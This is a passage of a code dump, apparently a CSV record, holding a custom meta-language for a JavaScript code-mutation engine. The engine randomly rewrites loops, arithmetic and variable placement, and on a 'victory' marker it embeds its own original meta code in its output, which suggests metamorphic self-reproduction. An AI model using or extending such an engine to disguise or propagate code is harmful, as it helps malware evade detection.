id,title,username,language,date,content
            MetaLevelLanguage+='__(CBC0300|)var CBCwhaction=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#x4fGiveMeString(#n64n#)4x#)+#n1n#2x#,#x3°+CBCSingleElement+°.lastIndexOf(#x5fGiveMeString(#n41n#)5x#)3x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0400|)var CBCwhNumOfElementsCode=#x1parseInt(#x2#O1°+CBCSingleElement+°#.substring(#x3°+CBCSingleElement+°.lastIndexOf(#x4fGiveMeString(#n41n#)4x#)3x#+#n1n#)1O#2x#,#n10n#)1x#'; 
            MetaLevelLanguage+='__(CBC0500|CBC0400)var CBCwhExecuteCode=#x1#O1°+argCodeBlockArray+°#.slice(#x2#x3°+CBCCodeLineIndex+°3x# +#n1n#2x#,#x4#x5°+CBCCodeLineIndex+°5x# + #x6°+CBCwhNumOfElementsCode+°6x# +#n1n#4x#)1O#1x#';
            MetaLevelLanguage+='__(CBC0600|)var CBCwhRNum2=#x1fGiveRandomNumber(#x2#n2n#2x#)1x#';
            MetaLevelLanguage+='__(CBC0700|)c+1(°+sNoDerivation1+°)';
            MetaLevelLanguage+='__(CBC0800|CBC0200,CBC0700)var CBCwhRLogic=#x1fCreateLogic(#x2°+CBCwhcondition+°2x#)1x#';
            MetaLevelLanguage+='__(CBC0900|CBC0800)ysNoDerivation1=#x1#n0n#1x#';
            MetaLevelLanguage+='__(CBC1000|CBC0100,CBC0300,CBC0500,CBC0600,CBC0900)if(#x1°+CBCwhRNum2+°1x#!#x2#n0n#2x#?==)016';
                MetaLevelLanguage+='__(CBC0100|)if(#x1#O1°+CBCwhinitial+°#.length1O#1x#!#x2#n0n#2x#?>)002';
                    MetaLevelLanguage+='__(CBC0100|CBC0110)yCBCLocalVarName.push(#x1#O1°+CBCwhinitial+°#.substring(#n4n#,#x2°+CBCwhinitial+°.indexOf(#x3fGiveMeString(#n61n#)3x#)2x#)1O#1x#)';                    
                    MetaLevelLanguage+='__(CBC0200|)yCBCLocalVarDefs.push(#x1#O1°+CBCwhinitial+°#.substring(#x2°+CBCwhinitial+°.indexOf(#x3fGiveMeString(61)3x#)+#n1n#2x#)1O#1x#)';
                MetaLevelLanguage+='__(CBC0200|)000';
                MetaLevelLanguage+='__(CBC0300|CBC0100)c+s(°+CBCRString+°,#x1sDeriveRestrString1x#)';
                MetaLevelLanguage+='__(CBC0400|CBC0300)c+s(°+CBCRString+°,#x1#""while(""#1x#)';
                MetaLevelLanguage+='__(CBC0500|CBC0400)c+s(°+CBCRString+°,#x1°+CBCwhRLogic+°1x#)';
                MetaLevelLanguage+='__(CBC0600|CBC0500)c+s(°+CBCRString+°,#x1#"")""#1x#)';                            
                MetaLevelLanguage+='__(CBC0700|CBC0600)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC0800|CBC0700)c+s(°+CBCRString+°,#x1fGiveMeString(#n123n#)1x#)';
                MetaLevelLanguage+='__(CBC0900|CBC0800)c+s(°+CBCRString+°,#x1fCreateBlockOfCode(#x2°+CBCwhExecuteCode+°2x#)1x#)';                                               
                MetaLevelLanguage+='__(CBC1000|CBC0900)if(#x1#O1°+CBCwhaction+°#.length1O#1x#!#x2#n0n#2x#?>)001';                
                    MetaLevelLanguage+='__(CBC0100|)c+s(°+CBCRString+°,#x1fCreateExecution(#x2°+CBCwhaction+°2x#,#x3#n1n#3x#)1x#)';
                MetaLevelLanguage+='__(CBC1100|)000';
                MetaLevelLanguage+='__(CBC1200|CBC1000)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';           
                MetaLevelLanguage+='__(CBC1300|CBC1200)c+s(°+CBCRString+°,#x1fGiveMeString(#n125n#)1x#)';  
            MetaLevelLanguage+='__(CBC1100|)000';
            MetaLevelLanguage+='__(CBC1200|CBC0100,CBC0300,CBC0500,CBC0600,CBC0900)if(#x1°+CBCwhRNum2+°1x#!#x2#n1n#2x#?==)016';
                MetaLevelLanguage+='__(CBC0100|)ysNoDerivation1=#x1#n1n#1x#';
                MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCRString+°,#x1sDeriveRestrString1x#)';
                MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCRString+°,#x1#""fo""#1x#)';
                MetaLevelLanguage+='__(CBC0400|CBC0300)c+s(°+CBCRString+°,#x1#""r(""#1x#)';                
                MetaLevelLanguage+='__(CBC0500|CBC0400)c+s(°+CBCRString+°,#x1°+CBCwhinitial+°1x#)';
                MetaLevelLanguage+='__(CBC0600|CBC0500)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
                MetaLevelLanguage+='__(CBC0700|CBC0600)c+s(°+CBCRString+°,#x1°+CBCwhRLogic+°1x#)';
                MetaLevelLanguage+='__(CBC0800|CBC0700)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
                MetaLevelLanguage+='__(CBC0900|CBC0800)c+s(°+CBCRString+°,#x1°+CBCwhaction+°1x#)';   
                MetaLevelLanguage+='__(CBC1000|CBC0900)c+s(°+CBCRString+°,#x1fGiveMeString(#n41n#)1x#)';                                                                                                                                 
                MetaLevelLanguage+='__(CBC1100|CBC1000)ysNoDerivation1=#x1#n0n#1x#';
                MetaLevelLanguage+='__(CBC1200|CBC1100)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
                MetaLevelLanguage+='__(CBC1300|CBC1200)c+s(°+CBCRString+°,#x1fGiveMeString(#n123n#)1x#)';
                MetaLevelLanguage+='__(CBC1400|CBC1300)c+s(°+CBCRString+°,#x1fCreateBlockOfCode(°+CBCwhExecuteCode+°)1x#)';   
                MetaLevelLanguage+='__(CBC1500|CBC1400)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';           
                MetaLevelLanguage+='__(CBC1600|CBC1500)c+s(°+CBCRString+°,#x1fGiveMeString(#n125n#)1x#)';  
            MetaLevelLanguage+='__(CBC1300|)000';
            MetaLevelLanguage+='__(CBC1400|CBC1000,CBC1200)c+n(°+CBCCodeLineIndex+°,#x1°+CBCwhNumOfElementsCode+°1x#)';
            MetaLevelLanguage+='__(CBC1500|CBC1000,CBC1200)c+1(°+CBCCodeLineIndex+°)';            
        MetaLevelLanguage+='__(CBCB080|)000';                   
        MetaLevelLanguage+='__(CBCB081|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n1n#)1O#1x#!#x2#""c""#2x#?==)042';        
            MetaLevelLanguage+='__(CBC0100|)var CBCcCalcCode=#x1#""""#1x#';
            MetaLevelLanguage+='__(CBC0200|CBC0100)if(#x1#O1°+CBCSingleElement+°#.substring(#n2n#,#n3n#)1O#1x#!#x2#""1""#2x#?==)007';            
                MetaLevelLanguage+='__(CBC0100|)var CBCVariable1=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#""(""#)+#n1n#2x#,#x3°+CBCSingleElement+°.lastIndexOf(#"")""#)3x#)1O#1x#';
                MetaLevelLanguage+='__(CBC0200|)var CBCVariable2=#x1#n1n#1x#';
                MetaLevelLanguage+='__(CBC0300|CBC0100)if(#x1fGiveRandomNumber(#n3n#)1x#!#n0n#?==)003';
                    MetaLevelLanguage+='__(CBC0100|)y°+CBCcCalcCode+°=#x1°+CBCVariable1+°1x#';
                    MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#n64n#)1x#)';
                    MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#n64n#)1x#)';                                         
                MetaLevelLanguage+='__(CBC0400|)000';
            MetaLevelLanguage+='__(CBC0300|)002';
                MetaLevelLanguage+='__(CBC0100|)var CBCVariable1=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#""(""#)+#n1n#2x#,#x3°+CBCSingleElement+°.indexOf(#"",""#)3x#)1O#1x#';
                MetaLevelLanguage+='__(CBC0200|)var CBCVariable2=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#"",""#)+#n1n#2x#,#x3°+CBCSingleElement+°.lastIndexOf(#"")""#)3x#)1O#1x#';                
            MetaLevelLanguage+='__(CBC0400|)ysDeriveRestrString=#x1#""""#1x#';            
            MetaLevelLanguage+='__(CBC0500|CBC0200,CBC0400)if(#x1°+CBCcCalcCode+°1x#!#x2#""""#2x#?==)019';
                MetaLevelLanguage+='__(CBC0100|)var CBCcWhichCalc=#x1fGiveRandomNumber(#n2n#)1x#';
                MetaLevelLanguage+='__(CBC0200|CBC0100)if(#x1°+CBCcWhichCalc+°1x#!#x2#n0n#2x#?==)003';
                    MetaLevelLanguage+='__(CBC0100|)c+s(°+CBCcCalcCode+°,#x1°+CBCVariable1+°1x#)';
                    MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#n64n#)+fGiveMeString(#n61n#)1x#)';                               
                    MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable2+°2x#,#x3#n20n#3x#)1x#)';                                          
                MetaLevelLanguage+='__(CBC0300|)013';
                    MetaLevelLanguage+='__(CBC0100|)var CBCSomeLog=#x1(#x2#O1°+CBCSingleElement+°#.substring(2,3)1O#==#""n""#2x#&&#x3fGiveRandomNumber(#n2n#)3x#)1x#';
                    MetaLevelLanguage+='__(CBC0200|CBC0100)if(#x1°+CBCSomeLog+°1x#!#x2#n0n#2x#?!=)005';
                        MetaLevelLanguage+='__(CBC0100|)c+s(°+CBCcCalcCode+°,#x1°+CBCVariable1+°1x#)';
                        MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCcCalcCode+°,#x1#""=""#1x#)';
                        MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable2+°2x#,#x3#n30n#3x#)1x#)';
                        MetaLevelLanguage+='__(CBC0400|CBC0300)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#x2#n64n#2x#)1x#)';
                        MetaLevelLanguage+='__(CBC0500|CBC0400)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable1+°2x#,#x3#n30n#3x#)1x#)';                      
                    MetaLevelLanguage+='__(CBC0300|)005';
                        MetaLevelLanguage+='__(CBC0100|)c+s(°+CBCcCalcCode+°,#x1°+CBCVariable1+°1x#)';
                        MetaLevelLanguage+='__(CBC0200|CBC0100)c+s(°+CBCcCalcCode+°,#x1#""=""#1x#)';  
                        MetaLevelLanguage+='__(CBC0300|CBC0200)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable1+°2x#,#x3#n30n#3x#)1x#)';  
                        MetaLevelLanguage+='__(CBC0400|CBC0300)c+s(°+CBCcCalcCode+°,#x1fGiveMeString(#x2#n64n#2x#)1x#)';  
                        MetaLevelLanguage+='__(CBC0500|CBC0400)c+s(°+CBCcCalcCode+°,#x1fDeriveRestrictVC(#x2°+CBCVariable2+°2x#,#x3#n30n#3x#)1x#)';                                                                                                                                            
            MetaLevelLanguage+='__(CBC0600|)000';            
            MetaLevelLanguage+='__(CBC0700|)var PMOperator=#x1#O1°+CBCSingleElement+°#.substring(#n1n#,#n2n#)1O#1x#';
            MetaLevelLanguage+='__(CBC0800|CBC0500,CBC0700)while($#x1#O1°+CBCcCalcCode+°#.indexOf(#x2fGiveMeString(#n64n#)2x#)1O#1x#!#x3#n-1n#3x#?!=@)001';
                MetaLevelLanguage+='__(CBC0100|)y°+CBCcCalcCode+°=#x1#O1°+CBCcCalcCode+°#.replace(#x2fGiveMeString(#n64n#)2x#,#x3°+PMOperator+°3x#)1O#1x#';    
            MetaLevelLanguage+='__(CBC0900|CBC0800)c+s(°+CBCRString+°,#x1sDeriveRestrString1x#)';
            MetaLevelLanguage+='__(CBC1000|CBC0900)c+s(°+CBCRString+°,#x1°+CBCcCalcCode+°1x#)';
            MetaLevelLanguage+='__(CBC1100|CBC1000)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBC1200|CBC1100)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                         
            MetaLevelLanguage+='__(CBC1500|CBC1200)c+1(°+CBCCodeLineIndex+°)';
        MetaLevelLanguage+='__(CBCB082|)000';                 
          MetaLevelLanguage+='__(CBCB100|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n1n#)1O#1x#!#x2#""x""#2x#?==)005';    
            MetaLevelLanguage+='__(CBCC100|)var xxExecuteableCode=#x1#O1°+CBCSingleElement+°#.substring(#n1n#)1O#1x#';
            MetaLevelLanguage+='__(CBCC200|CBCC100)c+s(°+CBCRString+°,#x1fCreateExecution(#x2°+xxExecuteableCode+°2x#)1x#)';
            MetaLevelLanguage+='__(CBCC300|CBCC200)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                                              
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';      
        MetaLevelLanguage+='__(CBCB110|)000';                      
        MetaLevelLanguage+='__(CBCB200|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n1n#)1O#1x#!""y""?==)005';    
            MetaLevelLanguage+='__(CBCC100|)var yyExecuteableCode=#x1#O1°+CBCSingleElement+°#.substring(#n1n#)1O#1x#';
            MetaLevelLanguage+='__(CBCC200|CBCC100)c+s(°+CBCRString+°,#x1fCreateExecution(°+yyExecuteableCode+°,1)1x#)';
            MetaLevelLanguage+='__(CBCC300|CBCC200)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                                              
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';   
        MetaLevelLanguage+='__(CBCB210|)000';                         
        MetaLevelLanguage+='__(CBCB300|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n3n#)1O#1x#!#x2#""def""#2x#?==)004';    
            MetaLevelLanguage+='__(CBCC200|)c+s(°+CBCRString+°,#x1fCreateExecution(#x2#O1°+CBCSingleElement+°#.substring(4)1O#2x#,#x3#n0n#3x#)1x#)';
            MetaLevelLanguage+='__(CBCC300|CBCC200)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                                          
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';      
        MetaLevelLanguage+='__(CBCB310|)000';  
        MetaLevelLanguage+='__(CBCB400|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n4n#)1O#1x#!#x2#""var ""#2x#?==)004';    
            MetaLevelLanguage+='__(CBCC200|)c+s(°+CBCRString+°,#x1fCreateExecution(#x2°+CBCSingleElement+°2x#,#n1n#)1x#)';
            MetaLevelLanguage+='__(CBCC300|CBCC200)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                                             
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';  
        MetaLevelLanguage+='__(CBCB410|)000';
        MetaLevelLanguage+='__(CBCB620|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n7n#)1O#1x#!#x2#""victory""#2x#?==)011'; 
            MetaLevelLanguage+='__(CBCC100|)if(#x1fGiveRandomNumber(#n2n#)1x#!#n0n#?>)002';
                MetaLevelLanguage+='__(CBCD100|)c+s(°+CBCRString+°,#x1#""va""#1x#)';
                MetaLevelLanguage+='__(CBCD200|CBCD100)c+s(°+CBCRString+°,#x1#""r ""#1x#)';                              
            MetaLevelLanguage+='__(CBCC101|)000';
            MetaLevelLanguage+='__(CBCC111|)xDoIWriteMetaCode=#n1n#';                 
            MetaLevelLanguage+='__(CBCC200|CBCC100)c+s(°+CBCRString+°,#x1#O1°+CBCSingleElement+°.substring(#n8n#)1O#1x#)';                                               
            MetaLevelLanguage+='__(CBCC250|CBCC111,CBCC200)c+s(°+CBCRString+°,#x1fCreateString(#x2°+OriginalMetaCode+°2x#)1x#)';    
            MetaLevelLanguage+='__(CBCC300|CBCC250)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';     
            MetaLevelLanguage+='__(CBCC710|CBCC250)xDoIWriteMetaCode=#n0n#';                                        
        MetaLevelLanguage+='__(CBCB630|)000';          
        MetaLevelLanguage+='__(CBCB500|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n9n#)1O#1x#!#x2#""function ""#2x#?==)009';    
            MetaLevelLanguage+='__(CBCC100|)var CBCfunctionname=#x1#O1°+CBCSingleElement+°#.substring(#n9n#,#x2°+CBCSingleElement+°.indexOf(#x3fGiveMeString(#n40n#)3x#)2x#)1O#1x#';
            MetaLevelLanguage+='__(CBCC200|)var CBCfunctionarguments=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#x3fGiveMeString(#n40n#)3x#)2x#,#x4#x5°+CBCSingleElement+°.indexOf(#x6fGiveMeString(#n41n#)6x#)5x#+#n1n#4x#)1O#1x#';
            MetaLevelLanguage+='__(CBCC300|)var CBCNumOfFFElementsCode=#x1parseInt(#x2#O1°+CBCSingleElement+°#.substring(#x3°+CBCSingleElement+°.indexOf("")"")+#n1n#3x#)1O#2x#,#x4#n10n#4x#)1x#';
            MetaLevelLanguage+='__(CBCC400|CBCC300)var CBCExecuteCode=#x1#O1°+argCodeBlockArray+°#.slice(#x2°+CBCCodeLineIndex+° +#n1n#2x#,#x3#x4°+CBCCodeLineIndex+°4x# + #x5°+CBCNumOfFFElementsCode+°5x# +#n1n#3x#)1O#1x#';
            MetaLevelLanguage+='__(CBCC500|CBCC400)ysFunctionDefs.push(#x1fCreateBlockOfCode(#x2°+CBCExecuteCode+°2x#)1x#)';
            MetaLevelLanguage+='__(CBCC600|CBCC200,CBCC500)ysFunctionArgs.push(#x1°+CBCfunctionarguments+°1x#)';
            MetaLevelLanguage+='__(CBCC700|CBCC100,CBCC500)ysFunctionNames.push(#x1°+CBCfunctionname+°1x#)';          
            MetaLevelLanguage+='__(CBCC800|CBCC400)c+n(°+CBCCodeLineIndex+°,#x1°+CBCNumOfFFElementsCode+°1x#)';
            MetaLevelLanguage+='__(CBCC900|CBCC400)c+1(°+CBCCodeLineIndex+°)';
        MetaLevelLanguage+='__(CBCB510|)000';
    MetaLevelLanguage+='__(CBC0700|CBC0600)c-1(sHierarchyOfCalls)';
    MetaLevelLanguage+='__(CBC0800|CBC0600)yCBCLocalVarName.reverse()';
    MetaLevelLanguage+='__(CBC0900|CBC0600)yCBCLocalVarDefs.reverse()';
    MetaLevelLanguage+='__(CBC1000|CBC0800,CBC0900)while($#x1°+CBCLocalVarName+°.length1x#!#x2#n0n#2x#?>@)007'
        MetaLevelLanguage+='__(CBC0100|)var CBCFirstPos=#x1#O1°+CBCRString+°#.indexOf(#x2°+CBCLocalVarName+°[#n0n#]2x#)1O#1x#';
        MetaLevelLanguage+='__(CBC0200|CBC0100)var CBCPotentialPos=#x1fFindPositionForCode(#x2°+CBCRString+°2x#,#x3°+CBCFirstPos+°3x#)1x#';
        MetaLevelLanguage+='__(CBC0300|)var CodeVarIntegrate=#x1#x2#""var ""#2x#+ #x3°+CBCLocalVarName+°[#n0n#]3x# +#x4#""=""#4x#+ #x5°+CBCLocalVarDefs+°[#n0n#]5x#+#x6fGiveMeString(#n64n#)6x#+#x7fGiveMeString(#n59n#)7x#1x#';
        MetaLevelLanguage+='__(CBC0400|CBC0300)yCBCLocalVarName.splice(#n0n#,#n1n#)';
        MetaLevelLanguage+='__(CBC0500|CBC0300)yCBCLocalVarDefs.splice(#n0n#,#n1n#)';
        MetaLevelLanguage+='__(CBC0600|CBC0200)var NewVarPos=#x1°+CBCPotentialPos+°[#x2fGiveRandomNumber(#x3#O1°+CBCPotentialPos+°#.length1O#3x#)2x#]1x#';
        MetaLevelLanguage+='__(CBC0700|CBC0300,CBC0400,CBC0500,CBC0600)y°+CBCRString+°=#x1#x2#O1°+CBCRString+°#.substring(0,°+NewVarPos+°)1O#2x#+ #x3°+CodeVarIntegrate+°3x# + #x4°+CBCRString+°.substring(#x5°+NewVarPos+°5x#)4x#1x#';
    MetaLevelLanguage+='__(CBC1100|CBC0700,CBC1000)if(#x1sHierarchyOfCalls1x#!#x2#n0n#2x#?!=)004'
        MetaLevelLanguage+='__(CBC0100|)while($#x1#O1°+CBCRString+°#.indexOf(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n59n#)4x#2x#)1O#1x#!#x5#n-1n#5x#?!=@)001'
            MetaLevelLanguage+='__(CBCA100|)y°+CBCRString+°=#x1#O1°+CBCRString+°#.replace(#x2fGiveMeString(#n64n#)+fGiveMeString(#n59n#)2x#,fGiveMeString(#n59n#))1O#1x#'
        MetaLevelLanguage+='__(CBC0200|CBC0100)while($#x1#O1°+CBCRString+°#.indexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n59n#)2x#)1O#1x#!#x3#n-1n#3x#?!=@)001';
            MetaLevelLanguage+='__(CBCA100|)y°+CBCRString+°=#x1#O1°+CBCRString+°#.replace(#x2fGiveMeString(#n64n#)2x#,#x3#""""#3x#)1O#1x#'
    MetaLevelLanguage+='__(CBC1200|)000';            
    MetaLevelLanguage+='__(CBC1300|CBC1100)xreturn(#x1°+CBCRString+°1x#)';
    

MetaLevelLanguage+='__(2100|)function fCalculateFirstAppearance(CFAOriginalCode,CFAObjectName)011';
    MetaLevelLanguage+='__(CFA010|)var CFAObjectPlace=#x1#O1°+CFAOriginalCode+°#.indexOf(#x2°+CFAObjectName+°2x#)1O#1x#';
    MetaLevelLanguage+='__(CFA020|CFA010)if(#x1°+CFAObjectPlace+°1x#!#x2#n-1n#2x#?==)007';
        MetaLevelLanguage+='__(CFAx10|)var CFAGetFunctionN=#x1#n-1n#1x#';
        MetaLevelLanguage+='__(CFAx20|CFAx10)while(var CFAn=#n0n#$#x1°+CFAn+°1x#!#x2#O1sFunctionVariableNameArray#.length1O#2x#?<@°+CFAn+°=°+CFAn+° +#n1n#)004';
            MetaLevelLanguage+='__(CFAy10|)while(var CFAm=#n0n#$#x1°+CFAm+°1x#!#x2#O1sFunctionVariableNameArray[#x3°+CFAn+°3x#]#.length1O#2x#?<@°+CFAm+°=°+CFAm+° +#n1n#)003';
                MetaLevelLanguage+='__(CFAz10|)if(#x1sFunctionVariableNameArray[#x2°+CFAn+°2x#][#x3°+CFAm+°3x#]1x#!#x4°+CFAObjectName+°4x#?==)001';
                    MetaLevelLanguage+='__(CFAw10|)y°+CFAGetFunctionN+°=#x1°+CFAn+°1x#';
                MetaLevelLanguage+='__(CFAz20|)000';
        MetaLevelLanguage+='__(CFAx30|CFAx20)y°+CFAObjectPlace+°=#x1#O1°+CFAOriginalCode+°#.indexOf(#x2sFunctionVariableFctName[#x3°+CFAGetFunctionN+°3x#]2x#)1O#1x#';
    MetaLevelLanguage+='__(CFA030|)000';
    MetaLevelLanguage+='__(CFA040|CFA020)xreturn(#x1°+CFAObjectPlace+°1x#)';


MetaLevelLanguage+='__(2200|)function fFindPositionForCode(FPFOriginalCode,FPFPosTrace)028';
    MetaLevelLanguage+='__(FPF010|)var FPFVPosArray=#x1[]1x#';                    
    MetaLevelLanguage+='__(FPF020|)var FPFSKPlace=#x1#n0n#1x#';
    MetaLevelLanguage+='__(FPF030|FPF010,FPF020)while($#x1°+FPFSKPlace+°1x#!#x2#n-1n#2x#?!=@)023';
        MetaLevelLanguage+='__(FPFa010|)var FPFSKPlace=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n59n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
        MetaLevelLanguage+='__(FPFa020|)var FPFBraPlace=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n123n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
        MetaLevelLanguage+='__(FPFa030|)var FPFKetPlace=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n125n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
        MetaLevelLanguage+='__(FPFa040|FPFa010,FPFa020,FPFa030)y°+FPFPosTrace+°=#x1#O1Math#.max(#x2°+FPFSKPlace+°2x#,#x3°+FPFBraPlace+°3x#,#x4°+FPFKetPlace+°4x#)1O#1x#';
        MetaLevelLanguage+='__(FPFa050|FPFa040)if(#x1°+FPFPosTrace+°1x#!#x2°+FPFSKPlace+°2x#?==)003';
            MetaLevelLanguage+='__(FPFb010|)if(#x1°+FPFSKPlace+°1x#!#x2#n-1n#2x#?!=)001';
                MetaLevelLanguage+='__(FPFc010|)y°+FPFVPosArray+°.push(#x2#x1°+FPFSKPlace+°1x# +#n2n#2x#)';
            MetaLevelLanguage+='__(FPFb020|)000';
        MetaLevelLanguage+='__(FPFa060|)000';
        MetaLevelLanguage+='__(FPFa070|FPFa050)if(#x1°+FPFPosTrace+°1x#!#x2°+FPFKetPlace+°2x#?==)012';
            MetaLevelLanguage+='__(FPFb010|)if(#x1°+FPFPosTrace+°1x#!#x2#n-1n#2x#?!=)010';
                MetaLevelLanguage+='__(FPFc010|)var FPFFoundKet=#x1#n1n#1x#';
                MetaLevelLanguage+='__(FPFc020|FPFc010)while($#x1°+FPFFoundKet+°1x#!#x2#n0n#2x#?>@)008';
                    MetaLevelLanguage+='__(FPFd010|)y°+FPFBraPlace+°=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n123n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
                    MetaLevelLanguage+='__(FPFd020|)y°+FPFKetPlace+°=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n125n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
                    MetaLevelLanguage+='__(FPFd030|FPFd010,FPFd020)if(#x1°+FPFBraPlace+°1x#!#x2°+FPFKetPlace+°2x#?>)002';
                        MetaLevelLanguage+='__(FPFe010|)c-1(°+FPFFoundKet+°)';
                        MetaLevelLanguage+='__(FPFe020|)y°+FPFPosTrace+°=#x1°+FPFBraPlace+°1x#';
                    MetaLevelLanguage+='__(FPFd030|)002';
                        MetaLevelLanguage+='__(FPFe010|)c+1(°+FPFFoundKet+°)'; 
                        MetaLevelLanguage+='__(FPFe020|)y°+FPFPosTrace+°=#x1°+FPFKetPlace+°1x#';
            MetaLevelLanguage+='__(FPFb020|)000';  
        MetaLevelLanguage+='__(FPFa080|)000';                                  
